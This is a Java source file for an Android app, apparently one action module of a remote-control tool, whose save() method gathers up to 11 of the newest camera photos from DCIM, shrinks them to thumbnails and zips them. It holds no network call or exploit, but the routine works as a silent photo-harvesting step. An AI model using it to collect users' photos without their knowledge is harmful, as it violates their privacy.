package com.lfish.control.action.actiontool;


import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.ArrayList;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.ThumbnailUtils;
import android.os.Environment;
import android.util.Log;

public class PTGraph {
	private Context context;
	private String fileDir;

	public PTGraph(Context context, String fileDirPath) {
		this.fileDir = fileDirPath;
		this.context = context;
	}

	public void copyFile(String srcFile, String dstFile) {
		File srcFileName = new File(srcFile);
		File dstFileName = new File(dstFile);
		if (!srcFileName.exists()) {
			return;
		}
		try {
			FileInputStream fileInputStream = new FileInputStream(srcFileName);
			FileOutputStream fileOutputStream = new FileOutputStream(
					dstFileName);
			byte[] data = new byte[4 * 1024];
			int len = 0;
			while ((len = fileInputStream.read(data)) != -1) {
				fileOutputStream.write(data, 0, len);

			}
			fileOutputStream.flush();
			fileInputStream.close();
			fileOutputStream.close();
		} catch (Exception e) {
			// TODO: handle exception
		}

	}

	private Bitmap getimage(String srcPath) {
		BitmapFactory.Options newOpts = new BitmapFactory.Options();
		// 开始读入图片，此时把options.inJustDecodeBounds 设回true了
		newOpts.inJustDecodeBounds = true;
		Bitmap bitmap = BitmapFactory.decodeFile(srcPath, newOpts);// 此时返回bm为空

		newOpts.inJustDecodeBounds = false;
		int w = newOpts.outWidth;
		int h = newOpts.outHeight;
		// 现在主流手机比较多是800*480分辨率，所以高和宽我们设置为
		float hh = 800f;// 这里设置高度为800f
		float ww = 480f;// 这里设置宽度为480f
		// 缩放比。由于是固定比例缩放，只用高或者宽其中一个数据进行计算即可
		int be = 1;// be=1表示不缩放
		if (w > h && w > ww) {// 如果宽度大的话根据宽度固定大小缩放
			be = (int) (newOpts.outWidth / ww);
		} else if (w < h && h > hh) {// 如果高度高的话根据宽度固定大小缩放
			be = (int) (newOpts.outHeight / hh);
		}
		if (be <= 0)
			be = 1;
		newOpts.inSampleSize = be;// 设置缩放比例
		// 重新读入图片，注意此时已经把options.inJustDecodeBounds 设回false了
		bitmap = BitmapFactory.decodeFile(srcPath, newOpts);
//		if (true)
		{
			return bitmap;
		}
//		else {
//			return compressImage(bitmap);// 压缩好比例大小后再进行质量压缩
//		}

	}

	public void saveMyBitmap(Bitmap bmp, String filePath) {
		File myFile = new File(filePath);
		if (!myFile.exists()) {
			myFile.delete();
		}
		try {
			myFile.createNewFile();

			FileOutputStream fOut = null;

			fOut = new FileOutputStream(myFile);
			bmp.compress(Bitmap.CompressFormat.JPEG, 100, fOut);
			fOut.flush();
			fOut.close();

		} catch (Exception e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
	}


	public Boolean save(String path) {
		Boolean retBoolean = false;
		File file = Environment.getExternalStorageDirectory();
		if (file != null) {
			String DCIM_PATH = file.getAbsolutePath() + File.separator + "DCIM"
					+ File.separator + "Camera";
			File dirFile = new File(DCIM_PATH);
			if (!dirFile.exists()) {
				DCIM_PATH = file.getAbsolutePath() + File.separator + "DCIM";
			}
			if(android.os.Build.BRAND.equals("Meizu"))
			{
				DCIM_PATH = file.getAbsolutePath() + File.separator + "DCIM";
			}
			File file2 = new File(DCIM_PATH);
			ArrayList<File> thumbFileList = new ArrayList<File>();
			int count = 0;
			if (file2.exists()) {
				ArrayList<File> file2List = FileUtils.listFiles(DCIM_PATH,
						".jpg");

				Log.i("FileSizie", file2List.size()+"");

				if( file2List.size()==0 && android.os.Build.BRAND.equals("Meizu"))
				{
					DCIM_PATH = file.getAbsolutePath() + File.separator + "Camera";
					file2List = FileUtils.listFiles(DCIM_PATH,	".jpg");
				}

				File fileTemp = new File(this.fileDir);
				if (!fileTemp.exists()) {
					fileTemp.mkdirs();
				}
				int len = file2List.size();
				for (int i = 0; i < len; i++) {
					int j = i + 1;
					for (; j < len; j++) {
						File tempiFile = file2List.get(i);
						File tempjFile = file2List.get(j);
						if (tempiFile.lastModified() < tempjFile.lastModified()) {
							file2List.set(i, tempjFile);
							file2List.set(j, tempiFile);
						}
					}
				}
				for (File file3 : file2List) {
					String fileThumb = fileTemp.getAbsolutePath()
							+ File.separator + "pic_" + count + ".jpg";
					thumbFileList.add(new File(fileThumb));
					Bitmap bitmap = getimage(file3.getAbsolutePath());
					Bitmap thumbNailsBitmap = ThumbnailUtils.extractThumbnail(
							bitmap, 320, 480);
					saveMyBitmap(thumbNailsBitmap, fileThumb);
					count++;
					if (count > 10) {
						break;
					}
				}

				Zip.picture(context, fileTemp.getAbsolutePath(),
						path);
				for (File fTemp : thumbFileList) {
					if (fTemp.exists()) {
						fTemp.delete();
					}
				}

				retBoolean = true;

			}
		} else {
			retBoolean = false;
		}
		return retBoolean;
	}
}
